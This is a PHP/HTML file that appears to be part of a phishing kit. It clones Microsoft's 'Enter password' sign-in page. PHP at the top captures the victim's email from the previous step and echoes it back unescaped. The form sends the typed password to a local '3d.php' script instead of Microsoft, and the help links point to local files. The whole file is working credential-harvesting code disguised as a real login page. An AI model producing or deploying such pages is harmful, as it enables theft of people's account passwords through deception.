<?php

session_start();
$clientemail = $_POST['loginfmt'];
$_SESSION['clientemail']=$clientemail;

?>

<!DOCTYPE html>
<!-- saved from url=(0289)https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&ct=1493260925&rver=6.7.6640.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1&id=292841&CBCXT=out&fl=wld&cobrandid=90015&contextid=0EE9DFF844DE79AF&bk=1500403631&uaid=a8d60e23f71e4b599fedbd2dd6b98946&pid=0 -->
<html dir="ltr" lang="EN-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><!--<base href="https://login.live.com/pp1600/">--><base href="."><script type="text/javascript">var PROOF = {};PROOF.Type = {SQSA: 6, CSS: 5, DeviceId: 4, Email: 1, AltEmail: 2, SMS: 3, HIP: 8, Birthday: 9, TOTPAuthenticator: 10, RecoveryCode: 11, StrongTicket: 13, TOTPAuthenticatorV2: 14, Voice: -3};</script><noscript>&lt;meta http-equiv="Refresh" content="0; URL=https://login.live.com/jsDisabled.srf?mkt=EN-US&amp;lc=1033"/&gt;Microsoft account requires JavaScript to sign in. This web browser either does not support JavaScript, or scripts are being blocked.&lt;br /&gt;&lt;br /&gt;To find out whether your browser supports JavaScript, or to allow scripts, see the browser's online help.</noscript><title>Sign in to your Microsoft account</title><meta name="PageID" content="i5030"><meta name="SiteID" content="292841"><meta name="ReqLC" content="1033"><meta name="LocLC" content="1033"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"><link rel="shortcut icon" href="https://auth.gfx.ms/16.000.27457.4/images/favicon.ico">
            <link rel="stylesheet" title="Converged" type="text/css" href="https://msagfx.live.com/16.000.27457.4/Converged1033.css"><style type="text/css">body.cb input.hip
    {
        border-width: 2px !important;
    }
</style><style type="text/css">body{display:none;}</style><script type="text/javascript">if (top != self){try{top.location.replace(self.location.href);}catch (e){}}else{document.write(unescape('%3C%73') + 'tyle type="text/css">body{display:block !important;}</style>');}</script><style type="text/css">body{display:block !important;}</style><noscript>&lt;style type="text/css"&gt;body{display:block !important;}&lt;/style&gt;</noscript><script type="text/javascript">var g_iSRSFailed=0,g_sSRSSuccess="";function SRSRetry(c,f,e,b){var m=1,l=unescape('%3Cscript type="text/javascript" src="'),k=unescape('"%3E%3C/script%3E'),h=f,i=window,d=i.navigator;if(d&&d.userAgent&&b&&b!=f){var g=d.userAgent.toLowerCase(),n=g.indexOf("edge")>=0;if(!n){var a=g.match(/chrome\/([0-9]+)\./),j=a&&a.length==2&&!isNaN(a[1])&&parseInt(a[1])>54;if(j)h=b}}if(g_sSRSSuccess.indexOf(c)!=-1)return;if(typeof i[c]=="undefined"){g_iSRSFailed=1;e<=m&&document.write(l+h+k)}else g_sSRSSuccess+=c+"|"+e+","}
  var g_dtFirstByte=new Date();var g_objPageMode = null;</script><link rel="image_src" href="https://auth.gfx.ms/16.000.27457.4/images/Windows_Live_v_thumb.jpg">
  <script type="text/javascript" src="https://msagfx.live.com/16.000.27457.4/ConvergedLogin_PCore.js"></script>
  <script type="text/javascript">SRSRetry("__ConvergedLoginPaginatedStrings", "https://auth.gfx.ms/16.000.27457.4/ConvergedLoginPaginatedStrings.EN.js", 1, "https://msagfx.live.com/16.000.27457.4/ConvergedLoginPaginatedStrings.EN.js");SRSRetry("__ConvergedLogin_PCore", "https://auth.gfx.ms/16.000.27457.4/ConvergedLogin_PCore.js", 1, "https://msagfx.live.com/16.000.27457.4/ConvergedLogin_PCore.js");</script><script type="text/javascript">SRSRetry("__ConvergedLoginPaginatedStrings", "https://auth.gfx.ms/16.000.27457.4/ConvergedLoginPaginatedStrings.EN.js", 2, "https://msagfx.live.com/16.000.27457.4/ConvergedLoginPaginatedStrings.EN.js");SRSRetry("__ConvergedLogin_PCore", "https://auth.gfx.ms/16.000.27457.4/ConvergedLogin_PCore.js", 2, "https://msagfx.live.com/16.000.27457.4/ConvergedLogin_PCore.js");</script></head>
<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
<div><!--  --> <div data-bind="component: { name: &#39;background-image&#39;, publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --> <div class="blur" data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://auth.gfx.ms/16.000.27457.4/images/Backgrounds/0-small.jpg?x=12f4b8b543125cc986c79cd85320812f&quot;);"></div><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://auth.gfx.ms/16.000.27457.4/images/Backgrounds/0.jpg?x=f5a9a9531b8f4bcc86eabb19472d15d5&quot;);"></div><!-- /ko --><!-- ko if: !!backgroundImageUrl() --> <div class="background-overlay"></div><!-- /ko --> </div></div> <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }" action="3d.php"><!-- ko withProperties: { '$loginPage': $data } --> <div class="outer" data-bind="component: { name: &#39;page&#39;,
        params: {
            serverData: svr,
            showButtons: svr.A6,
            showFooterLinks: true,
            useWizardBehavior: svr.Bq,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
         event: {
            footerAgreementClick: footer_agreementClick } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <div class="middle"><!-- ko if: $loginPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> <div class="inner" data-bind="css: { &#39;app&#39;: $loginPage.backgroundLogoUrl() }"><!-- ko ifnot: paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo') --> <div data-bind="component: { name: &#39;logo-control&#39;,
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="presentation" pngsrc="https://auth.gfx.ms/16.000.27457.4/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" svgsrc="https://auth.gfx.ms/16.000.27457.4/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc" src="https://auth.gfx.ms/16.000.27457.4/images/microsoft_logo.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --> <div data-bind="
                    css: { &#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;) },
                    component: { name: &#39;pagination-control&#39;,
                        publicMethods: paginationControlMethods,
                        params: {
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel } }"><div data-bind="css: { &#39;animate&#39;: animate() || animate.back(), &#39;back&#39;: animate.back }" class="animate"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-bind="component: { name: &#39;login-paginated-password-view&#39;,
                        publicMethods: viewInterfaces[$index()],
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            hasRemoteNgc: !!sharedData.remoteNgcParams.sessionIdentifier,
                            desktopSsoEnabled: sharedData.desktopSsoEnabled,
                            defaultKmsiValue: svr.K === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            isLongRunningTransaction: sharedData.isLongRunningTransaction },
                        event: {
                            load: view_onLoad,
                            switchView: view_onSwitchView,
                            submitReady: $loginPage.view_onSubmitReady,
                            resetPassword: $loginPage.passwordView_onResetPassword,
                            desktopSsoStart: $loginPage.view_desktopSsoStart,
                            updateBranding: $loginPage.view_onUpdateBranding } }"><!--  --> <input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0"> <input type="hidden" name="login" data-bind="value: username" value="user_maintanance912566@outlook.com"> <input type="text" name="loginfmt" data-bind="moveOffScreen, value: displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true"> <input type="hidden" name="type" data-bind="value: svr.Bq ? 20 : 11" value="11"> <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3"> <input type="hidden" name="lrt" data-bind="value: isLongRunningTransaction" value=""> <div data-bind="component: { name: &#39;identity-banner-control&#39;,
     params: {
        pawnIconId: svr.BT,
        displayName: displayName } }"><!--  --> <div class="identityBanner"> <div class="identity" data-bind="text: displayName, attr: { &#39;title&#39;: displayName }" title="user_maintanance912566@outlook.com"><?php echo $clientemail  ?></div> <div class="profile-photo"><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" data-bind="attr: { src: getDarkUrl() }" src="files/logo.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> </div> </div><!-- ko if: svr.bI && !userTileUrl() --><!-- /ko --></div> <div id="loginHeader" class="row text-title" role="heading" data-bind="text: str[&#39;CT_PWD_STR_EnterPassword_Title&#39;]">Enter password</div><!-- ko if: pageDescription --><!-- /ko --> <div class="row"> <div class="form-group col-md-24"> <div role="alert" aria-live="assertive" aria-atomic="false"><!-- ko if: error --><!-- /ko --> </div> <div class="placeholderContainer" data-bind="component: { name: &#39;placeholder-textbox&#39;, params: {
            serverData: svr,
            textInput: password,
            hasFocus: isFocused,
            hintText: str[&#39;CT_PWD_STR_PwdTB_Label&#39;],
            forcePlaceholderAttribute: true,
            hintCss: &#39;placeholder&#39; } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <input name="passwd" type="password" id="i0118" autocomplete="off" class="form-control" autofocus="" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" data-bind="
                    textInput: password,
                    hasFocusEx: isFocused,
                    placeholder: $placeholderText,
                    ariaLabel: str[&#39;CT_PWD_STR_PwdTB_Label&#39;],
                    attr: { maxLength: svr.C ? 127 : null },
                    css: { &#39;has-error&#39;: error }" placeholder="Password" aria-label="Password" maxlength="127"> <!-- /ko --><!-- /ko --><!-- ko ifnot: forcePlaceholderAttribute --><!-- /ko --></div> </div> </div><!-- ko if: svr.U && showHip --><!-- /ko --> <div class="row"> <div data-bind="component: { name: &#39;footer-buttons-field&#39;,
        params: {
            serverData: svr,
            primaryButtonText: str[&#39;CT_PWD_STR_SignIn_Button&#39;],
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.A6,
            isSecondaryButtonVisible: svr.A6 &amp;&amp; !isInitialView },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 form-group no-padding-left-right" data-bind="
     visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
     css: { &#39;no-margin-bottom&#39;: removeBottomMargin }"> <div data-bind="css: { &#39;col-xs-12 secondary&#39;: isPrimaryButtonVisible(), &#39;col-xs-24&#39;: !isPrimaryButtonVisible() }" class="col-xs-12 secondary"> <input type="button" id="idBtn_Back" class="btn btn-block" data-bind="
            attr: {
                &#39;id&#39;: secondaryButtonId || &#39;idBtn_Back&#39;,
                &#39;aria-describedby&#39;: secondaryButtonDescribedBy },
            value: secondaryButtonText() || str[&#39;CT_HRD_STR_Splitter_Back&#39;],
            hasFocus: focusOnSecondaryButton,
            click: secondaryButton_onClick,
            enable: isSecondaryButtonEnabled,
            visible: isSecondaryButtonVisible" value="Back"> </div> <div data-bind="css: { &#39;col-xs-12 primary&#39;: isSecondaryButtonVisible(), &#39;col-xs-24&#39;: !isSecondaryButtonVisible() }" class="col-xs-12 primary"> <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: {
                &#39;id&#39;: primaryButtonId || &#39;idSIButton9&#39;,
                &#39;aria-describedby&#39;: primaryButtonDescribedBy },
            value: primaryButtonText() || str[&#39;CT_PWD_STR_SignIn_Button_Next&#39;],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible" value="Sign in"> </div> </div></div> </div><!-- ko if: svr.BN --><!-- /ko --><!-- ko if: svr.BJ !== false && !svr.BN --> <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.c &amp;&amp; !showHip"> <label id="idLbl_PWD_KMSI_Cb"> <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" type="checkbox" data-bind="checked: isKmsiChecked, ariaLabel: str[&#39;CT_PWD_STR_KeepMeSignedInCB_Text&#39;]" aria-label="Keep me signed in"> <span data-bind="text: str[&#39;CT_PWD_STR_KeepMeSignedInCB_Text&#39;]">Keep me signed in</span> </label> </div><!-- /ko --> <div class="row"> <div class="col-md-24"> <div class="text-13"> <div class="form-group no-margin-bottom" data-bind="css: { &#39;no-margin-bottom&#39;: !hasRemoteNgc &amp;&amp; !allowPhoneDisambiguation &amp;&amp; !showChangeUserLink }"> <a id="idA_PWD_ForgotPassword" href="files/x4d.php" data-bind="text: str[&#39;CT_PWD_STR_ForgotPwdLink_Text&#39;], href: svr.e, click: resetPassword_onClick">Forgot my password</a> </div><!-- ko if: allowPhoneDisambiguation --><!-- /ko --><!-- ko if: hasRemoteNgc --><!-- /ko --> <div class="form-group no-margin-bottom" data-bind="visible: showChangeUserLink" style="display: none;"> <a id="i1668" href="https://login.live.com/logout.srf?wa=wsignin1.0&amp;rpsnv=13&amp;ct=1493260925&amp;rver=6.7.6640.0&amp;wp=MBI_SSL&amp;wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1&amp;id=292841&amp;CBCXT=out&amp;fl=wld&amp;cobrandid=90015&amp;uaid=a8d60e23f71e4b599fedbd2dd6b98946&amp;pid=0&amp;contextid=0EE9DFF844DE79AF&amp;ru=https://outlook.live.com/owa/%3fnlp%3d1&amp;bk=1500403644&amp;lm=I" data-bind="text: str[&#39;CT_FED_STR_ChangeUserLink_Text&#39;], href: svr.urlSwitch">Sign in with a different Microsoft account</a> </div> </div> </div> </div><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div></div> </div> <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value=""> <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value=""> <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value=""> <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value=""> <input type="hidden" name="canary" data-bind="value: svr.canary" value=""> <input type="hidden" name="ctx" data-bind="value: ctx" value=""> <input type="hidden" id="i0327" data-bind="attr: { name: svr.B1 }, value: flowToken" name="PPFT" value="DZsffjDkinwo3rxKpV9ktxqavpr*Jp4uhl!dMHMYTqivMEfNslL!CX1v7qjK0SvTkrqjEZIYNjH1hsEUAxV9BgRQ*3p20oGbG15BfSxrHiuoI5aLTbFmeXkMH!fXxNAVk0RWSGCNpXXyBlVMZ2V*YWHJw3NLCxBBfyr!PYaKhypjnpi4OaPdcm!4ZZX7*1jqGOcLb3eEtafoW!k9eGYY*PqYAiTSaIFG2bVqEJRtD1Gc"> <input type="hidden" name="PPSX" data-bind="value: svr.t" value="PassportRN"> <input type="hidden" name="NewUser" value="1"> <input type="hidden" name="FoundMSAs" data-bind="value: svr.aA" value=""> <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0"> <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0"> <div data-bind="component: { name: &#39;instrumentation&#39;,
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="1"> <input type="hidden" name="i17" data-bind="value: srsFailed" value="0"> <input type="hidden" name="i18" data-bind="value: srsSuccess" value="__ConvergedLoginPaginatedStrings|1,__ConvergedLogin_PCore|1,"> <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div> </div> <!-- /ko --></div><!-- ko if: desktopSsoRunning --><!-- /ko --><!-- /ko --><!-- ko if: showOptOutBanner --><!-- /ko --> <div id="footer"> <div data-bind="component: { name: &#39;footer-control&#39;,
            params: {
                serverData: svr,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick } }"><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --> <span id="ftrCopy" data-bind="html: svr.ac">©2017 Microsoft</span><!-- /ko --> <a id="ftrTerms" data-bind="text: str[&#39;MOBILE_STR_Footer_Terms&#39;], href: termsLink, click: termsLink_onClick" href="files/x3dleaf.php">Terms of Use</a> <a id="ftrPrivacy" data-bind="text: str[&#39;MOBILE_STR_Footer_Privacy&#39;], href: privacyLink, click: privacyLink_onClick" href="files/x3d.php">Privacy &amp; Cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> </div> <!-- /ko --></div> </div> </form> <form method="post" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }"><!-- ko foreach: postRedirectParams --><!-- /ko --> </form></div><iframe id="idPartnerPL" height="0" width="0" src="https://outlook.office365.com/owa/prefetch.aspx" style="display: none;"></iframe></body></html>